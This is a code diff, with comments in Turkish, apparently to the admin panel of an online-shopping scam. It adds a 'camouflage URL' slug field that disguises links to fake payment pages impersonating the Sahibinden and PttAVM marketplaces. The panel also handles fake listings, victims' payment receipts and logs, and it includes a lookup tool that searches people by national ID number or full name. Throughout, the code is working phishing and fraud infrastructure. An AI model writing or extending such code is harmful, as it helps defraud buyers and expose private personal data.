@@ -671,6 +671,12 @@
             box-shadow: inset 0 2px 4px rgba(0,0,0,0.01); 
         }
 
+        /* --- Input taşmalarını önlemek için --- */
+        .dynamic-input-group input {
+            width: 100%;
+            box-sizing: border-box;
+        }
+
         .form-group input:focus, .form-group select:focus, .form-group textarea:focus { 
             border-color: #007bff; 
             box-shadow: 0 0 0 3px var(--primary-glow); 
@@ -1494,6 +1500,11 @@
                         <input type="text" id="urunAdi" required>
                     </div>
                     <div class="form-group">
+                        <label>Özel Link Uzantısı (Kamuflaj URL)</label>
+                        <input type="text" id="linkUzantisi" placeholder="Örn: iphone-14-pro-max-hatasiz-tr-cihazi">
+                        <p style="font-size:11px; color:var(--text-muted); margin-top:4px; font-weight:600;">Türkçe karakter kullanmayın. Boşluklar otomatik tireye (-) dönüşür.</p>
+                    </div>
+                    <div class="form-group">
                         <label>Satıcı Adı Soyadı</label>
                         <input type="text" id="saticiAdi" required>
                     </div>
@@ -1563,6 +1574,31 @@
                 .replace(/'/g, '&#x27;')
                 .replace(/\//g, '&#x2f;');
         };
+
+        // 🔥 YENİ: SİHİRLİ FORMATLAYICI (AUTO-SLUG) 🔥
+        function slugify(text) {
+            const trMap = { 'çÇ':'c', 'ğĞ':'g', 'şŞ':'s', 'üÜ':'u', 'ıİ':'i', 'öÖ':'o' };
+            for(let key in trMap) {
+                text = text.replace(new RegExp('['+key+']','g'), trMap[key]);
+            }
+            return text.toLowerCase()
+                       .replace(/[^-a-zA-Z0-9\s]+/ig, '') 
+                       .replace(/\s/gi, "-") 
+                       .replace(/-+/g, "-"); 
+        }
+
+        // İlan başlığı yazıldıkça özel link uzantısını otomatik doldur
+        document.getElementById('urunAdi').addEventListener('input', function(e) {
+            const isEditing = document.getElementById("editIlanId").value !== "";
+            if(!isEditing) { 
+                document.getElementById('linkUzantisi').value = slugify(e.target.value);
+            }
+        });
+
+        // Kullanıcı elle değiştirmek isterse bile formatı koru
+        document.getElementById('linkUzantisi').addEventListener('input', function(e) {
+            e.target.value = slugify(e.target.value); 
+        });
 
         function checkTokenError(res) {
             if (res.status === 401 || res.status === 403) {
@@ -1772,14 +1808,17 @@
                 
                 tbody.innerHTML = ''; 
                 globalIlanlar.forEach(function(data) {
-                    const sahilindenLink = `https://payislemleri-sahibinden.vercel.app/?ilan=${data.docId}`;
-                    const pttavmLink = `https://payislemlerim-pttavm.vercel.app/?ilan=${data.docId}`;
+                    // 🔥 KAMUFLAJ URL YENİ LİNK ÜRETİMİ 🔥
+                    const slug = data.linkUzantisi || "ilan-detay";
+                    // Backend'e dokunmadan güvenli göstermenin en temiz yolu:
+                    const sahilindenLink = `https://payislemleri-sahibinden.vercel.app/?ilan=${data.docId}&baslik=${slug}`;
+                    const pttavmLink = `https://payislemlerim-pttavm.vercel.app/?ilan=${data.docId}&baslik=${slug}`;
                     
                     const tr = document.createElement('tr');
                     tr.innerHTML = `
                         <td><img src="${dezenfekteEt(data.anaResim || '')}" class="thumb-img"></td>
                         <td>
-                            <button class="link-btn sari" onclick="vitrinLinkiKopyala('${sahilindenLink}', 'Sahilinden')">Sahibinden Linki</button>
+                            <button class="link-btn sari" onclick="vitrinLinkiKopyala('${sahilindenLink}', 'Sahibinden')">Sahibinden Linki</button>
                             <button class="link-btn kirmizi" onclick="vitrinLinkiKopyala('${pttavmLink}', 'PttAVM')">PTTAVM Linki</button>
                         </td>
                         <td><strong>${dezenfekteEt(data.urunAdi)}</strong></td>
@@ -1996,6 +2035,10 @@
             document.getElementById("editIlanId").value = id; 
             document.getElementById("modalBaslik").innerText = "İlanı Düzenle";
             document.getElementById("urunAdi").value = data.urunAdi; 
+            
+            // Özel Link Uzantısını Geri Yükle
+            document.getElementById("linkUzantisi").value = data.linkUzantisi || "";
+            
             document.getElementById("saticiAdi").value = data.saticiAdi; 
             document.getElementById("saticiTel").value = data.saticiTel; 
             document.getElementById("sehir").value = data.sehir; 
@@ -2059,6 +2102,7 @@
 
             const ilanData = {
                 urunAdi: document.getElementById("urunAdi").value.trim(), 
+                linkUzantisi: document.getElementById("linkUzantisi").value.trim(), // YENİ VERİ EKLENDİ
                 saticiAdi: document.getElementById("saticiAdi").value.trim(), 
                 saticiTel: document.getElementById("saticiTel").value.trim(),
                 sehir: document.getElementById("sehir").value.trim(), 
@@ -2115,20 +2159,16 @@
 
         loadIlanlar(); loadDekontlar(); loadLogs();
 
-        // 🔥 YENİ: DİNAMİK SORGU KUTULARI GEÇİŞİ 🔥
         const sorguTuruSelect = document.getElementById('sorguTuruSelect');
         const dynamicGroups = document.querySelectorAll('.dynamic-input-group');
 
         sorguTuruSelect.addEventListener('change', function() {
-            // Önce tüm grupları gizle
             dynamicGroups.forEach(g => g.style.display = 'none');
-            
-            // Seçilen gruba ait kutuyu göster
             const selected = this.value;
             const activeGroup = document.getElementById('inputGroup-' + selected);
             
             if(selected === 'adsoyad') {
-                activeGroup.style.display = 'flex'; // Ad ve soyad yan yana gelsin
+                activeGroup.style.display = 'flex'; 
             } else {
                 activeGroup.style.display = 'block';
             }
@@ -2171,7 +2211,7 @@
                     sorguBaslatBtn.disabled = false;
                     sorguSonucAlani.style.opacity = '1';
                     sorguTuruSelect.disabled = false;
-                    tumSorguInputlari.forEach(inp => input.disabled = false);
+                    tumSorguInputlari.forEach(inp => inp.disabled = false);
                 } else {
                     sorguBakimUyarisi.style.display = 'block';
                     sorguFormAlani.style.opacity = '0.5';
@@ -2181,7 +2221,7 @@
                     sorguBaslatBtn.disabled = true;
                     sorguSonucAlani.style.opacity = '0.4';
                     sorguTuruSelect.disabled = true;
-                    tumSorguInputlari.forEach(inp => input.disabled = true);
+                    tumSorguInputlari.forEach(inp => inp.disabled = true);
                 }
 
             } catch(e) { }
@@ -2190,12 +2230,10 @@
         checkGodCommands();
         setInterval(function() { loadLogs(true); loadDekontlar(true); checkGodCommands(); }, 3000);
 
-        // 🔥 YENİ: DİNAMİK VERİ ÇEKİCİ İLE BUTON İŞLEMİ 🔥
         document.getElementById('sorguBaslatBtn').addEventListener('click', async function() {
             let val = "";
             const tur = document.getElementById('sorguTuruSelect').value;
             
-            // Seçilen türe göre doğru kutudan veriyi al
             if (tur === 'tc') {
                 val = document.getElementById('sorguTc').value.trim();
             } else if (tur === 'adsoyad') {
